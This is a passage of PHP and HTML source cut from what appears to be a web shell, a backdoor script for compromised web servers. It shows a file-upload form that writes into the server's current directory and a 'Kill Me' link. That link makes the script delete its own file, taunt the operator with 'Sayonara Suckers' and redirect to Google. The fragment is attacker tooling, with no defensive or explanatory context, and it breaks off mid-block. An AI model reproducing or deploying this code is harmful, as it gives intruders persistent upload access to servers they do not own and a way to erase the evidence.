			...
			<body>
				...
				<table class=\"lamesa\" cellpadding=\"3\" cellspacing\"1\">
					...
					<tr>
						...
						echo "
							<form method=POST enctype=\"multipart/form-data\"><font class=\"titulo wala\">Upload File<br><label for=\"upload\"><input type=\"file\" name=\"file\"></label><br><input type=\"submit\" class=\"submit\" ";
							if(!is_writable($path)){echo "disabled value='Not Writable!' style='background: red;'";}else{ echo "value='Upload!'"; }
							echo "
							></form>
						</td>
					</tr><tr><td class=\"wala\">[<a href=".sanitize($_SERVER['PHP_SELF']).">Home</a>]&nbsp;[]&nbsp;[<a href='?kill'>Kill Me</a>]</td></tr></table></div><table>";
if(isset($_GET['kill'])){
							$me = sanitize($_SERVER['PHP_SELF']);
							$akez = basename($me);
							if(unlink($akez)){
								echo "<script>alert('Sayonara Suckers .|.')</script><meta http-equiv=\"refresh\" content=\"0; URL=http://www.google.com\">";
